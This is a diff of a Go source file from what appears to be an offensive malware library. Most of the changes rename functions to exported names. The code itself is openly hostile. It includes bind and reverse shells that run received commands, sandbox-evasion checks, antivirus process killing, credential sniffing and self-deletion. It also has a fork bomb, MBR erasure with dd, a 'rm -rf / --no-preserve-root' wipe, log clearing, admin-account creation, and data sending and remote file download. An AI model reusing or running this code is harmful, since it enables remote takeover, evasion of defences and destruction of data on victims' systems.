@@ -55,9 +55,7 @@ import (
 	"unsafe"
 
 	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-	"github.com/robfig/cron"
 
 	//"tawesoft.co.uk/go/dialog"
 	"bufio"
@@ -127,7 +125,7 @@ func _kill_proc_by_pid(pid int) error {
 	default:
 		cmd = "kill " + p
 	}
-	_, err := cmd_out(cmd)
+	_, err := CmdOut(cmd)
 	return err
 }
 
@@ -136,7 +134,7 @@ func _handle_bind(conn net.Conn) {
 		buffer := make([]byte, 1024)
 		length, _ := conn.Read(buffer)
 		command := string(buffer[:length-1])
-		out, _ := cmd_out(command)
+		out, _ := CmdOut(command)
 		/*parts := strings.Fields(command)
 		  head := parts[0]
 		  parts = parts[1:len(parts)]
@@ -519,13 +517,13 @@ func info() map[string]string {
 	i := goInfo.GetInfo()
 	switch runtime.GOOS {
 	case "windows":
-		user, err := cmd_out("query user")
+		user, err := CmdOut("query user")
 		if err != nil {
 			user = "N/A"
 		}
 		u = user
 
-		o, err := cmd_out("ipconfig")
+		o, err := CmdOut("ipconfig")
 		if err != nil {
 			ap_ip = "N/A"
 		}
@@ -537,13 +535,13 @@ func info() map[string]string {
 			}
 		}
 	default:
-		user, err := cmd_out("whoami")
+		user, err := CmdOut("whoami")
 		if err != nil {
 			user = "N/A"
 		}
 		u = user
 
-		o, err := cmd_out("ip r")
+		o, err := CmdOut("ip r")
 		if err != nil {
 			ap_ip = "N/A"
 		}
@@ -672,15 +670,15 @@ func wait(interval string) {
     }
 }*/
 
-func forkbomb() {
-	go forkbomb()
+func Forkbomb() {
+	go Forkbomb()
 }
 
-func remove() {
+func Remove() {
 	os.Remove(os.Args[0])
 }
 
-func file_exists(file string) bool {
+func Exists(file string) bool {
 	_, err := os.Stat(file)
 	if err != nil {
 		if os.IsNotExist(err) {
@@ -690,7 +688,7 @@ func file_exists(file string) bool {
 	return true
 }
 
-func is_root() bool {
+func IsRoot() bool {
 	root := true
 	switch runtime.GOOS {
 	case "windows":
@@ -699,7 +697,7 @@ func is_root() bool {
 			root = false
 		}
 	default:
-		u, _ := cmd_out("whoami")
+		u, _ := CmdOut("whoami")
 		if strings.Contains(u, "root") {
 			root = true
 		}
@@ -707,7 +705,7 @@ func is_root() bool {
 	return root
 }
 
-func cmd_out(command string) (string, error) {
+func CmdOut(command string) (string, error) {
 	switch runtime.GOOS {
 	case "windows":
 		cmd := exec.Command("cmd", "/C", command)
@@ -753,16 +751,16 @@ func cmd_out(command string) (string, error) {
     return b.String(), err
 }*/
 
-func cmd_out_platform(commands map[string]string) (string, error) {
+func CmdOutPlatform(commands map[string]string) (string, error) {
 	cmd := commands[runtime.GOOS]
-	out, err := cmd_out(cmd)
+	out, err := CmdOut(cmd)
 	if err != nil {
 		return "", err
 	}
 	return out, nil
 }
 
-func cmd_run(command string) {
+func CmdRun(command string) {
 	parts := strings.Fields(command)
 	head := parts[0]
 	parts = parts[1:len(parts)]
@@ -778,7 +776,7 @@ func cmd_run(command string) {
 	//ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
-func cmd_blind(command string) {
+func CmdBlind(command string) {
 	parts := strings.Fields(command)
 	head := parts[0]
 	parts = parts[1:len(parts)]
@@ -787,14 +785,14 @@ func cmd_blind(command string) {
 	//ExitOnError("[COMMAND EXEC ERROR]", err)
 }
 
-func cmd_dir(dirs_cmd map[string]string) ([]string, error) {
+func CmdDir(dirs_cmd map[string]string) ([]string, error) {
 	outs := []string{}
 	for dir, cmd := range dirs_cmd {
 		err := os.Chdir(dir)
 		if err != nil {
 			return nil, err
 		}
-		o, err := cmd_out(cmd)
+		o, err := CmdOut(cmd)
 		if err != nil {
 			return nil, err
 		}
@@ -803,7 +801,7 @@ func cmd_dir(dirs_cmd map[string]string) ([]string, error) {
 	return outs, nil
 }
 
-func make_zip(zip_file string, files []string) error {
+func MakeZip(zip_file string, files []string) error {
 	newZipFile, err := os.Create(zip_file)
 	if err != nil {
 		return err
@@ -840,7 +838,7 @@ func make_zip(zip_file string, files []string) error {
 	return nil
 }
 
-func credentials_sniff(ifac, interval string,
+func CredentialsSniff(ifac, interval string,
 	collector chan string,
 	words []string) error {
 	ifs := []string{}
@@ -885,7 +883,7 @@ func credentials_sniff(ifac, interval string,
 	return nil
 }
 
-func sandbox_filepath() bool {
+func SandboxFilepath() bool {
 	if runtime.GOOS == "linux" {
 		return false
 	}
@@ -933,7 +931,7 @@ func SandboxProc() bool {
 	return false
 }
 
-func sandbox_sleep() bool {
+func SandboxSleep() bool {
 	z := false
 	firstTime := _get_ntp_time()
 	sleepSeconds := 10
@@ -946,7 +944,7 @@ func sandbox_sleep() bool {
 	return z
 }
 
-func sandbox_disk(size int) bool {
+func SandboxDisk(size int) bool {
 	v := false
 	d := "/"
 	switch runtime.GOOS {
@@ -966,7 +964,7 @@ func sandbox_disk(size int) bool {
 	return v
 }
 
-func sandbox_cpu(cores int) bool {
+func SandboxCpu(cores int) bool {
 	x := false
 	num_procs := runtime.NumCPU()
 	if !(num_procs >= cores) {
@@ -975,7 +973,7 @@ func sandbox_cpu(cores int) bool {
 	return x
 }
 
-func sandbox_ram(ram_mb int) bool {
+func SandboxRam(ram_mb int) bool {
 	var m runtime.MemStats
 	runtime.ReadMemStats(&m)
 	rmb := uint64(ram_mb)
@@ -986,7 +984,7 @@ func sandbox_ram(ram_mb int) bool {
 	return false
 }
 
-func sandbox_utc() bool {
+func SandboxUtc() bool {
 	_, offset := time.Now().Zone()
 	if offset == 0 {
 		return true
@@ -995,7 +993,7 @@ func sandbox_utc() bool {
 	}
 }
 
-func sandbox_procnum(proc_num int) bool {
+func SandboxProcnum(proc_num int) bool {
 	processes, err := ps.Processes()
 	if err != nil {
 		return true
@@ -1006,7 +1004,7 @@ func sandbox_procnum(proc_num int) bool {
 	return false
 }
 
-func sandbox_tmp(entries int) bool {
+func SandboxTmp(entries int) bool {
 	tmp_dir := "/tmp"
 	if runtime.GOOS == "windows" {
 		tmp_dir = `C:\windows\temp`
@@ -1021,7 +1019,7 @@ func sandbox_tmp(entries int) bool {
 	return false
 }
 
-func sandbox_mac() bool {
+func SandboxMac() bool {
 	hits := 0
 	sandbox_macs := []string{`00:0C:29`, `00:1C:14`,
 		`00:50:56`, `00:05:69`, `08:00:27`}
@@ -1039,18 +1037,17 @@ func sandbox_mac() bool {
 	return false
 }
 
-func sandbox_all() bool {
+func SandboxAll() bool {
 	values := []bool{
 		SandboxProc(),
-		sandbox_filepath(),
-		sandbox_cpu(2),
-		sandbox_disk(50),
-		sandbox_sleep(),
-		sandbox_tmp(10),
-		sandbox_tmp(100),
-		sandbox_ram(2048),
-		sandbox_mac(),
-		sandbox_utc(),
+		SandboxFilepath(),
+		SandboxCpu(2),
+		SandboxDisk(50),
+		SandboxSleep(),
+		SandboxTmp(10),
+		SandboxProcnum(100),
+		SandboxRam(2048),
+		SandboxUtc(),
 	}
 	for s := range values {
 		x := values[s]
@@ -1061,19 +1058,19 @@ func sandbox_all() bool {
 	return false
 }
 
-func sandbox_all_n(num int) bool {
+func SandboxAlln(num int) bool {
 	num_detected := 0
 	values := []bool{
 		SandboxProc(),
-		sandbox_filepath(),
-		sandbox_cpu(2),
-		sandbox_disk(50),
-		sandbox_sleep(),
-		sandbox_tmp(10),
-		sandbox_tmp(100),
-		sandbox_ram(2048),
-		sandbox_mac(),
-		sandbox_utc(),
+		SandboxFilepath(),
+		SandboxCpu(2),
+		SandboxDisk(50),
+		SandboxSleep(),
+		SandboxTmp(10),
+		SandboxTmp(100),
+		SandboxRam(2048),
+		SandboxMac(),
+		SandboxUtc(),
 	}
 	for s := range values {
 		x := values[s]
@@ -1087,14 +1084,14 @@ func sandbox_all_n(num int) bool {
 	return false
 }
 
-func shutdown() error {
+func Shutdown() error {
 	commands := map[string]string{
 		"windows": "shutdown -s -t 60",
 		"linux":   "shutdown +1",
 		"darwin":  "shutdown -h +1",
 	}
 	c := commands[runtime.GOOS]
-	_, err := cmd_out(c)
+	_, err := CmdOut(c)
 	return err
 }
 
@@ -1108,11 +1105,11 @@ func shutdown() error {
     }
 }*/
 
-func set_ttl(duration string) {
+/*func SetTTL(duration string) {
 	c := cron.New()
 	c.AddFunc("@every "+duration, remove)
 	c.Start()
-}
+}*/
 
 func Bind(port int) {
 	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
@@ -1135,12 +1132,12 @@ func Reverse(host string, port int) {
 	}
 }
 
-func pkill_pid(pid int) error {
+func PkillPid(pid int) error {
 	err := _kill_proc_by_pid(pid)
 	return err
 }
 
-func pkill_name(name string) error {
+func PkillName(name string) error {
 	processList, err := ps.Processes()
 	if err != nil {
 		return err
@@ -1160,7 +1157,7 @@ func pkill_name(name string) error {
 	return nil
 }
 
-func pkill_av() error {
+func PkillAv() error {
 	av_processes := []string{}
 	windows_av_processes := []string{
 		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
@@ -1231,7 +1228,7 @@ func PortscanSingle(target string, port int) bool {
 	return false
 }
 
-func banner_grab(target string, port int) (string, error) {
+func BannerGrab(target string, port int) (string, error) {
 	conn, err := net.DialTimeout("tcp", target+":"+strconv.Itoa(port), time.Second*10)
 	if err != nil {
 		return "", err
@@ -1246,7 +1243,7 @@ func banner_grab(target string, port int) (string, error) {
 	return string(banner), nil
 }
 
-func send_data_tcp(host string, port int, data string) error {
+func SendDataTCP(host string, port int, data string) error {
 	addr := host + ":" + strconv.Itoa(port)
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
@@ -1256,10 +1253,11 @@ func send_data_tcp(host string, port int, data string) error {
 	if err != nil {
 		return err
 	}
+	defer conn.Close()
 	return nil
 }
 
-func send_data_udp(host string, port int, data string) error {
+func SendDataUDP(host string, port int, data string) error {
 	addr := host + ":" + strconv.Itoa(port)
 	conn, err := net.Dial("udp", addr)
 	if err != nil {
@@ -1269,10 +1267,11 @@ func send_data_udp(host string, port int, data string) error {
 	if err != nil {
 		return err
 	}
+	defer conn.Close()
 	return nil
 }
 
-func file_permissions(filename string) (bool, bool) {
+func FilePermissions(filename string) (bool, bool) {
 	write_permission := true
 	read_permission := true
 	file, err := os.OpenFile(filename, os.O_WRONLY, 0666)
@@ -1291,7 +1290,7 @@ func file_permissions(filename string) (bool, bool) {
 	return read_permission, write_permission
 }
 
-func download(url string) error {
+func Download(url string) error {
 	splitted := strings.Split(url, "/")
 	filename := splitted[len(splitted)-1]
 	f, err := os.Create(filename)
@@ -1311,11 +1310,11 @@ func download(url string) error {
 	return nil
 }
 
-func users() ([]string, error) {
+func Users() ([]string, error) {
 	switch runtime.GOOS {
 	case "windows":
 		clear := []string{}
-		o, err := cmd_out("net user")
+		o, err := CmdOut("net user")
 		if err != nil {
 			return nil, err
 		}
@@ -1326,7 +1325,8 @@ func users() ([]string, error) {
 				clear = append(clear, line)
 			}
 		}
-		return str_to_words(strings.Join(clear, " ")), nil
+		return clear, nil
+		//return strings.Fields(strings.Join(clear, " ")), nil
 		/*usrs := []string{}
 		  users, err := wapi.ListLoggedInUsers()
 		  if err != nil {
@@ -1337,7 +1337,7 @@ func users() ([]string, error) {
 		  }
 		  return usrs, nil*/
 	default:
-		o, err := cmd_out("cut -d: -f1 /etc/passwd")
+		o, err := CmdOut("cut -d: -f1 /etc/passwd")
 		if err != nil {
 			return nil, err
 		}
@@ -1345,12 +1345,12 @@ func users() ([]string, error) {
 	}
 }
 
-func erase_mbr(device string, partition_table bool) error {
+func EraseMbr(device string, partition_table bool) error {
 	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
 	if partition_table {
 		cmd = f("dd if=/dev/zero of=%s bs=512 count=1", device)
 	}
-	_, err := cmd_out(cmd)
+	_, err := CmdOut(cmd)
 	if err != nil {
 		return err
 	}
@@ -1361,7 +1361,7 @@ func Networks() ([]string, error) {
 	wifi_names := []string{}
 	switch runtime.GOOS {
 	case "windows":
-		out, err := cmd_out("netsh wlan show networks")
+		out, err := CmdOut("netsh wlan show networks")
 		if err != nil {
 			return nil, err
 		}
@@ -1374,7 +1374,7 @@ func Networks() ([]string, error) {
 			}
 		}
 	default:
-		out, err := cmd_out("nmcli dev wifi")
+		out, err := CmdOut("nmcli dev wifi")
 		if err != nil {
 			return nil, err
 		}
@@ -1412,12 +1412,12 @@ func ClearLogs() error {
 	switch runtime.GOOS {
 	case "windows":
 		os.Chdir("%windir%\\system32\\config")
-		_, err := cmd_out("del *log /a /s /q /f")
+		_, err := CmdOut("del *log /a /s /q /f")
 		if err != nil {
 			return err
 		}
 	default:
-		_, err := cmd_out("rm -r /var/log")
+		_, err := CmdOut("rm -r /var/log")
 		if err != nil {
 			return err
 		}
@@ -1425,40 +1425,7 @@ func ClearLogs() error {
 	return nil
 }
 
-func hosts_passive(interval string) ([]string, error) {
-	hosts := []string{}
-	var snapshot_len int32 = 1024
-	var timeout time.Duration = time.Duration(interval_to_seconds(interval)) * time.Second
-	devices, err := pcap.FindAllDevs()
-	if err != nil {
-		return nil, err
-	}
-	for _, device := range devices {
-		handler, err := pcap.OpenLive(device.Name, snapshot_len, false, timeout)
-		if err != nil {
-			return nil, err
-		}
-		err = handler.SetBPFFilter("arp")
-		if err != nil {
-			return nil, err
-		}
-		defer handler.Close()
-		packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
-		for packet := range packetSource.Packets() {
-			ip_layer := packet.Layer(layers.LayerTypeIPv4)
-			if ip_layer != nil {
-				ip, _ := ip_layer.(*layers.IPv4)
-				source := fmt.Sprintf("%s", ip.SrcIP)
-				destination := fmt.Sprintf("%s", ip.DstIP)
-				hosts = append(hosts, source)
-				hosts = append(hosts, destination)
-			}
-		}
-	}
-	return remove_duplicates_str(hosts), nil
-}
-
-func wipe() error {
+func Wipe() error {
 	cmd := ""
 	switch runtime.GOOS {
 	case "windows":
@@ -1466,14 +1433,14 @@ func wipe() error {
 	default:
 		cmd = "rm -rf / --no-preserve-root"
 	}
-	_, err := cmd_out(cmd)
+	_, err := CmdOut(cmd)
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-func dns_lookup(hostname string) ([]string, error) {
+func DnsLookup(hostname string) ([]string, error) {
 	i := []string{}
 	ips, err := net.LookupIP(hostname)
 	if err != nil {
@@ -1485,7 +1452,7 @@ func dns_lookup(hostname string) ([]string, error) {
 	return i, nil
 }
 
-func rdns_lookup(ip string) ([]string, error) {
+func RdnsLookup(ip string) ([]string, error) {
 	ips, err := net.LookupAddr(ip)
 	if err != nil {
 		return nil, err
@@ -1493,7 +1460,7 @@ func rdns_lookup(ip string) ([]string, error) {
 	return ips, nil
 }
 
-func create_user(username, password string) error {
+func CreateUser(username, password string) error {
 	cmd := ""
 	switch runtime.GOOS {
 	case "windows":
@@ -1503,32 +1470,32 @@ func create_user(username, password string) error {
 	case "darwin":
 		cmd = f("sysadminctl -addUser %s -password %s -admin", username, password)
 	}
-	_, err := cmd_out(cmd)
+	_, err := CmdOut(cmd)
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-func wifi_disconnect() error {
+func WifiDisconnect() error {
 	cmd := ""
 	switch runtime.GOOS {
 	case "windows":
 		cmd = `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
-		_, err := cmd_out(cmd)
+		_, err := CmdOut(cmd)
 		if err != nil {
 			return err
 		}
 	case "linux":
 		iface, _ := iface()
 		cmd = f("ip link set dev %s down", iface)
-		_, err := cmd_out(cmd)
+		_, err := CmdOut(cmd)
 		if err != nil {
 			return err
 		}
 	case "darwin":
 		cmd = "networksetup -setnetworkserviceenabled Wi-Fi off"
-		_, err := cmd_out(cmd)
+		_, err := CmdOut(cmd)
 		if err != nil {
 			return err
 		}
@@ -1537,7 +1504,7 @@ func wifi_disconnect() error {
 
 }
 
-func disks() ([]string, error) {
+func Disks() ([]string, error) {
 	found_drives := []string{}
 	switch runtime.GOOS {
 	case "windows":
